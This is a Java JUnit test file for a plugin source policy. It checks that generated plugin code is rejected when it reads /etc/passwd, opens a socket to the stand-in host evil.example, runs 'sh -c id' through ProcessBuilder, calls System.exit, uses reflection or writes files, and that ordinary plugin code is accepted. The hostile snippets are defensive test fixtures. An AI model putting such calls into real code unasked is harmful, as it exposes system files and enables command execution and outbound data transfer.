package com.npdev.generator;

import com.npdev.generator.emitters.PluginJavaSourcePolicy;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * SEC-3 / B30 generation-side admission: plugin Java source ({@code plugin:java-source} /
 * {@code plugin:java-controller}) that references capability escapes must be refused at GENERATION
 * time, while ordinary plugin idiom (package declarations, Spring/web imports, java.util.*,
 * benign java.util.concurrent.atomic.*) must pass.
 */
class PluginJavaSourcePolicyTest {

    private static void assertPluginRejected(String caseName, String source) {
        IllegalStateException exception = assertThrows(
                IllegalStateException.class,
                () -> PluginJavaSourcePolicy.validatePluginJavaSource(source, "capabilities/" + caseName + "/src/main/java/Evil.java"),
                "expected rejection for " + caseName
        );
        assertTrue(exception.getMessage().contains("Forbidden plugin Java source use"),
                "message must identify the plugin gate: " + exception.getMessage());
    }

    private static void assertPluginAccepted(String caseName, String source) {
        assertDoesNotThrow(
                () -> PluginJavaSourcePolicy.validatePluginJavaSource(source, "capabilities/" + caseName + "/src/main/java/Ok.java"),
                "expected acceptance for " + caseName
        );
    }

    @Test
    void rejectsSystemExit() {
        assertPluginRejected("system-exit", """
                package com.npdev.plugin.evil;

                public final class Evil {
                    public void run() {
                        System.exit(0);
                    }
                }
                """);
    }

    @Test
    void rejectsSystemExitViaStaticImport() {
        assertPluginRejected("system-exit-static-import", """
                package com.npdev.plugin.evil;

                import static java.lang.System.exit;

                public final class Evil {
                    public void run() {
                        exit(0);
                    }
                }
                """);
    }

    @Test
    void rejectsFilesystemRead() {
        assertPluginRejected("file-read", """
                package com.npdev.plugin.evil;

                import java.nio.file.Files;
                import java.nio.file.Path;

                public final class Evil {
                    public String read() throws Exception {
                        return Files.readString(Path.of("/etc/passwd"));
                    }
                }
                """);
    }

    @Test
    void rejectsSocketConnection() {
        assertPluginRejected("socket", """
                package com.npdev.plugin.evil;

                import java.net.Socket;

                public final class Evil {
                    public void connect() throws Exception {
                        try (Socket socket = new Socket("evil.example", 443)) {
                            socket.getOutputStream().write(1);
                        }
                    }
                }
                """);
    }

    @Test
    void rejectsProcessBuilder() {
        assertPluginRejected("process-builder", """
                package com.npdev.plugin.evil;

                public final class Evil {
                    public void run() throws Exception {
                        new ProcessBuilder("sh", "-c", "id").start();
                    }
                }
                """);
    }

    @Test
    void rejectsReflection() {
        assertPluginRejected("reflection", """
                package com.npdev.plugin.evil;

                public final class Evil {
                    public void run() throws Exception {
                        Class<?> type = Class.forName("java.lang.System");
                        System.out.println(type);
                    }
                }
                """);
    }

    @Test
    void rejectsDetachedAsyncWork() {
        assertPluginRejected("async", """
                package com.npdev.plugin.evil;

                import java.util.concurrent.Executors;

                public final class Evil {
                    public void run() {
                        Executors.newFixedThreadPool(4);
                    }
                }
                """);
    }

    @Test
    void rejectsFullyQualifiedReflectiveClassAccess() {
        assertPluginRejected("reflection-qualified", """
                package com.npdev.plugin.evil;

                public final class Evil {
                    public Object run() throws Exception {
                        return java.lang.Class.forName("com.internal.Secrets");
                    }
                }
                """);
    }

    @Test
    void acceptsClassTypePositionsAndConsolePrintln() {
        // Mirrors the ADAPTED lib-probe capability (E8): Class<?> appears only in a generic TYPE
        // position (erases to Object, no java/lang/Class owner reference -- the bytecode gate
        // agrees), System.out.println goes through the exempted java/io/PrintStream, and Guava's
        // Hashing is an ordinary external-library call. SEC-3/B30 must not refuse any of it.
        assertPluginAccepted("class-type-and-println", """
                package com.npdev.plugin.libsig;

                import com.google.common.hash.Hashing;

                import java.nio.charset.StandardCharsets;
                import java.util.LinkedHashMap;
                import java.util.Map;

                public final class LibrarySignatureCapability {

                    public Map<String, Object> sign(Map<String, Object> input, Class<?> unrelated) {
                        String payload = input == null || input.get("payload") == null
                                ? "" : String.valueOf(input.get("payload"));
                        String digest = Hashing.sha256().hashString(payload, StandardCharsets.UTF_8).toString();
                        System.out.println("[probe] sha256(" + payload + ") = " + digest);
                        Map<String, Object> result = new LinkedHashMap<>();
                        result.put("payload", payload);
                        result.put("digest", digest);
                        return result;
                    }
                }
                """);
    }

    @Test
    void rejectsWildcardIoImport() {
        assertPluginRejected("wildcard-io", """
                package com.npdev.plugin.evil;

                import java.io.*;

                public final class Evil {
                    public void run() throws Exception {
                        new FileOutputStream("/tmp/evil").write(1);
                    }
                }
                """);
    }

    @Test
    void acceptsCleanCapabilityLikeTheShippedAuditLogSample() {
        assertPluginAccepted("audit-log", """
                package com.npdev.samples.dslconformance.audit;

                import java.time.Instant;
                import java.util.LinkedHashMap;
                import java.util.Map;
                import java.util.concurrent.atomic.AtomicLong;

                public final class AuditLogCapability {
                    private static final AtomicLong SEQUENCE = new AtomicLong();

                    public Map<String, Object> record(Map<String, Object> input) {
                        long sequence = SEQUENCE.incrementAndGet();
                        Map<String, Object> result = new LinkedHashMap<>();
                        result.put("sequence", sequence);
                        result.put("recordedAt", Instant.now().toString());
                        result.put("entry", input == null ? Map.of() : input);
                        return result;
                    }
                }
                """);
    }

    @Test
    void acceptsControllerLikePluginSource() {
        assertPluginAccepted("controller", """
                package com.npdev.generated.plugin.admintools;

                import org.springframework.web.bind.annotation.GetMapping;
                import org.springframework.web.bind.annotation.RequestMapping;
                import org.springframework.web.bind.annotation.RestController;

                import java.util.LinkedHashMap;
                import java.util.Map;

                @RestController
                @RequestMapping("/api/plugins/admin-tools")
                public final class AdminToolsController {

                    @GetMapping("/ping")
                    public Map<String, Object> ping() {
                        Map<String, Object> body = new LinkedHashMap<>();
                        body.put("ok", true);
                        body.put("controller", "AdminToolsController");
                        return body;
                    }
                }
                """);
    }

    @Test
    void acceptsPlainLogicWithHarmlessNames() {
        assertPluginAccepted("plain-logic", """
                package com.npdev.plugin.mine;

                import java.util.Map;
                import java.util.LinkedHashMap;

                public final class Capability {
                    public Map<String, Object> run(Map<String, Object> input) {
                        String message = String.valueOf(input.getOrDefault("message", ""));
                        boolean looksLikePath = message.startsWith("/");
                        boolean isExitWord = message.equalsIgnoreCase("exit");
                        Map<String, Object> result = new LinkedHashMap<>();
                        result.put("startsWithSlash", looksLikePath);
                        result.put("isExitWord", isExitWord);
                        return result;
                    }
                }
                """);
    }
}